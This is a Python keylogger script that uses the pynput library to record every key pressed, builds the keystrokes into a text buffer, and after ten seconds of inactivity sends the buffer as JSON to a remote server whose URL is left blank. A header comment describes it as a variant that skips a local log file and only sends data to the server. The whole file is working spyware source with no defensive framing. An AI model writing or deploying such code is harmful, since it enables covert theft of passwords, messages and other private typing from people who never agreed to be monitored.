#This is the same as app_withlog
#   but without saving to log.txt, only sends to server

import requests
import threading
import json
from pynput.keyboard import Listener, Key

local_url = ""  # Replace with the URL of your local server
captured_words = ""
timer = None

def send_post_req():
    global captured_words
    try:
        payload = json.dumps({"keyboardData": captured_words})
        r = requests.post(local_url, data=payload, headers={"Content-Type": "application/json"})
    except:
        print("Couldn't complete request!")
    finally:
        captured_words = ""  # Clear the captured words

def schedule_request():
    global timer
    timer = threading.Timer(10, send_post_req)
    timer.start()

def cancel_request():
    global timer
    if timer:
        timer.cancel()

def write_to_file(key):
    global captured_words
    special_keys = {
        Key.space: ' ',
        Key.enter: ' | ',
        Key.backspace: '',
        # Add your other special keys here
    }

    if key in special_keys:
        captured_words += special_keys[key]
    else:
        letter = str(key).replace("'", "")
        captured_words += letter

    cancel_request()  # Cancel the previous timer
    schedule_request()  # Schedule a new timer

with Listener(on_press=write_to_file) as l:
    schedule_request()
    l.join()